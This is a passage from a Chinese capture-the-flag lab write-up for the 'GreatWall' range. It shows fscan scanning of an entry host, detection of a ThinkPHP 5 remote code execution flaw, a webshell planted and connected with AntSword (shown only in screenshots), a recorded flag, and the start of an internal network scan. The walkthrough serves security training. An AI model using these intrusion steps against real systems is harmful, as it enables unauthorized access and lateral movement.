<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Yunjing/dimension/GreatWall/index" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.6.3">
<title data-rh="true">2024 - GreatWall | Target Machines WriteUp</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Yunjing/dimension/GreatWall/"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="2024 - GreatWall | Target Machines WriteUp"><meta data-rh="true" name="description" content="在这个靶场中，您将扮演一名渗透测试工程师，接受雇佣任务来评估 “SmartLink Technologies Ltd.” 公司的网络安全状况。 您的任务是首先入侵该公司暴露在公网上的应用服务，然后运用后渗透技巧深入 SmartLink 公司的内部网络。在这个过程中，您将寻找潜在的弱点和漏洞，并逐一接管所有服务，从而控制整个内部网络。靶场中共设置了 6 个 Flag，它们分布在不同的靶机上，您需要找到并获取这些 Flag 作为您的成就目标。"><meta data-rh="true" property="og:description" content="在这个靶场中，您将扮演一名渗透测试工程师，接受雇佣任务来评估 “SmartLink Technologies Ltd.” 公司的网络安全状况。 您的任务是首先入侵该公司暴露在公网上的应用服务，然后运用后渗透技巧深入 SmartLink 公司的内部网络。在这个过程中，您将寻找潜在的弱点和漏洞，并逐一接管所有服务，从而控制整个内部网络。靶场中共设置了 6 个 Flag，它们分布在不同的靶机上，您需要找到并获取这些 Flag 作为您的成就目标。"><link data-rh="true" rel="icon" href="/Target-Machines-WriteUp/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Yunjing/dimension/GreatWall/"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Yunjing/dimension/GreatWall/" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Yunjing/dimension/GreatWall/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/Target-Machines-WriteUp/blog/rss.xml" title="Target Machines WriteUp RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/Target-Machines-WriteUp/blog/atom.xml" title="Target Machines WriteUp Atom Feed">



<link rel="preconnect" href="https://static.cloudflareinsights.com">
<script src="https://static.cloudflareinsights.com/beacon.min.js" defer="defer" data-cf-beacon="{&quot;token&quot;:&quot;419208379f5c472a9afad0d3dc0396f9&quot;}"></script>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.24/dist/katex.min.css" integrity="sha384-odtC+0UGzzFL/6PNoE8rX/SPcQDXBJ+uRepguP4QkPCm2LBxH3FA3y+fKSiJ+AmM" crossorigin="anonymous"><link rel="stylesheet" href="/Target-Machines-WriteUp/assets/css/styles.b5431df6.css">
<script src="/Target-Machines-WriteUp/assets/js/runtime~main.1928ef7e.js" defer="defer"></script>
<script src="/Target-Machines-WriteUp/assets/js/main.6d0739a2.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/Target-Machines-WriteUp/"><div class="navbar__logo"><img src="/Target-Machines-WriteUp/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/Target-Machines-WriteUp/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">Target Machines WriteUp</b></a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/HackTheBox/">HackTheBox</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/Target-Machines-WriteUp/docs/Yunjing/"> 春秋云境 </a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/HackMyVM/">HackMyVM</a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/Xuanji/"> 玄机 </a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/Independent-Environment/"> 其他靶场 </a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/ToolsGuide/">Tools Guide</a></div><div class="navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/blog">Blog</a><a href="https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search searchBarContainer_NW3z"><input placeholder="搜索" aria-label="Search" class="navbar__search-input"><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/Target-Machines-WriteUp/docs/Yunjing/">春秋云境</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/Target-Machines-WriteUp/docs/category/YunjingDimension">多维挑战</a><button aria-label="折叠侧边栏分类 &#x27;多维挑战&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/Target-Machines-WriteUp/docs/Yunjing/dimension/GreatWall/">2024 - GreatWall</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/Yunjing/dimension/Wangdingcup/">2022 - 网鼎杯半决赛复盘</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/Yunjing/dimension/Endless/">无间计划</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/Target-Machines-WriteUp/docs/category/YunjingMajor">专业徽章</a><button aria-label="展开侧边栏分类 &#x27;专业徽章&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/Target-Machines-WriteUp/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/Target-Machines-WriteUp/docs/category/YunjingDimension"><span itemprop="name">多维挑战</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">2024 - GreatWall</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>2024 - GreatWall</h1></header>
<p>在这个靶场中，您将扮演一名渗透测试工程师，接受雇佣任务来评估 “SmartLink Technologies Ltd.” 公司的网络安全状况。 您的任务是首先入侵该公司暴露在公网上的应用服务，然后运用后渗透技巧深入 SmartLink 公司的内部网络。在这个过程中，您将寻找潜在的弱点和漏洞，并逐一接管所有服务，从而控制整个内部网络。靶场中共设置了 6 个 Flag，它们分布在不同的靶机上，您需要找到并获取这些 Flag 作为您的成就目标。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>信息</div><div class="admonitionContent_BuS1"><p>Tags</p><ul>
<li>内网渗透</li>
</ul></div></div>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">入口点</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">8.130.110.24</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="入口点探测">入口点探测<a href="#入口点探测" class="hash-link" aria-label="入口点探测的直接链接" title="入口点探测的直接链接">​</a></h2>
<p>直接使用 <code>fscan</code> 进行扫描探测</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">start infoscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">8.130</span><span class="token plain">.110.24:8080 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">8.130</span><span class="token plain">.110.24:22 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">8.130</span><span class="token plain">.110.24:80 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> alive ports len is: </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">start vulscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> WebTitle http://8.130.110.24      code:200 len:10887  title:</span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> WebTitle http://8.130.110.24:8080 code:200 len:1027   title:Login Form</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> PocScan http://8.130.110.24:8080 poc-yaml-thinkphp5023-method-rce poc1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="入口点-thinkphp-webshell">入口点 ThinkPHP Webshell<a href="#入口点-thinkphp-webshell" class="hash-link" aria-label="入口点 ThinkPHP Webshell的直接链接" title="入口点 ThinkPHP Webshell的直接链接">​</a></h2>
<p>发现 <code>http://8.130.110.24:8080</code> 服务存在有 ThinkPHP 直接 RCE 漏洞，尝试利用</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240822-152225-ee36cb769581085a5b38bfc06db50a83.png" width="1474" height="1097" class="img_ev3q"></p>
<p>存在有以下利用 payload</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[+] 目标存在 tp5_construct_code_exec_2 漏洞</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 目标存在 tp5_construct_code_exec_1 漏洞</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>尝试直接命令执行，发现无回显</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240825-152529-27d0199a6ebcb243ef629f36be74506e.png" width="1474" height="1097" class="img_ev3q"></p>
<p>尝试直接写入 webshell</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240828-152818-5f8b246ccd9c175769907cb7a3d13aff.png" width="1474" height="1097" class="img_ev3q"></p>
<p>然后利用蚁剑建立连接</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240828-152847-cecbb34969c55391c12636469d060e42.png" width="1542" height="1040" class="img_ev3q"></p>
<p>成功植入 webshell</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="flag---01">flag - 01<a href="#flag---01" class="hash-link" aria-label="flag - 01的直接链接" title="flag - 01的直接链接">​</a></h2>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">flag01: flag{176f49b6-147f-4557-99ec-ba0a351e1ada}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="内网扫描-1722823024">内网扫描 172.28.23.0/24<a href="#内网扫描-1722823024" class="hash-link" aria-label="内网扫描 172.28.23.0/24的直接链接" title="内网扫描 172.28.23.0/24的直接链接">​</a></h2>
<p>上传 <code>fscan</code> 到入口点靶机之后，查看网卡信息</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">remote</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> www-data@portal:/var/www/html/background/public$ </span><span class="token function" style="color:#d73a49">ifconfig</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">eth0: </span><span class="token assign-left variable" style="color:#36acaa">flags</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">416</span><span class="token operator file-descriptor important" style="color:#393A34">3</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">UP,BROADCAST,RUNNING,MULTICAST</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">  mtu </span><span class="token number" style="color:#36acaa">1500</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        inet </span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.17  netmask </span><span class="token number" style="color:#36acaa">255.255</span><span class="token plain">.0.0  broadcast </span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.255.255</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        inet6 fe80::216:3eff:fe04:8b0a  prefixlen </span><span class="token number" style="color:#36acaa">64</span><span class="token plain">  scopeid 0x2</span><span class="token operator file-descriptor important" style="color:#393A34">0</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">link</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ether 00:16:3e:04:8b:0a  txqueuelen </span><span class="token number" style="color:#36acaa">1000</span><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Ethernet</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        RX packets </span><span class="token number" style="color:#36acaa">54139</span><span class="token plain">  bytes </span><span class="token number" style="color:#36acaa">65477946</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">65.4</span><span class="token plain"> MB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        RX errors </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  dropped </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  overruns </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  frame </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        TX packets </span><span class="token number" style="color:#36acaa">16175</span><span class="token plain">  bytes </span><span class="token number" style="color:#36acaa">3092855</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">3.0</span><span class="token plain"> MB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        TX errors </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  dropped </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> overruns </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  carrier </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  collisions </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lo: </span><span class="token assign-left variable" style="color:#36acaa">flags</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">7</span><span class="token operator file-descriptor important" style="color:#393A34">3</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">UP,LOOPBACK,RUNNING</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">  mtu </span><span class="token number" style="color:#36acaa">65536</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        inet </span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1  netmask </span><span class="token number" style="color:#36acaa">255.0</span><span class="token plain">.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        inet6 ::1  prefixlen </span><span class="token number" style="color:#36acaa">128</span><span class="token plain">  scopeid 0x1</span><span class="token operator file-descriptor important" style="color:#393A34">0</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">host</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        loop  txqueuelen </span><span class="token number" style="color:#36acaa">1000</span><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Local Loopback</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        RX packets </span><span class="token number" style="color:#36acaa">712</span><span class="token plain">  bytes </span><span class="token number" style="color:#36acaa">67453</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">67.4</span><span class="token plain"> KB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        RX errors </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  dropped </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  overruns </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  frame </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        TX packets </span><span class="token number" style="color:#36acaa">712</span><span class="token plain">  bytes </span><span class="token number" style="color:#36acaa">67453</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">67.4</span><span class="token plain"> KB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        TX errors </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  dropped </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> overruns </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  carrier </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  collisions </span><span class="token number" style="color:#36acaa">0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" 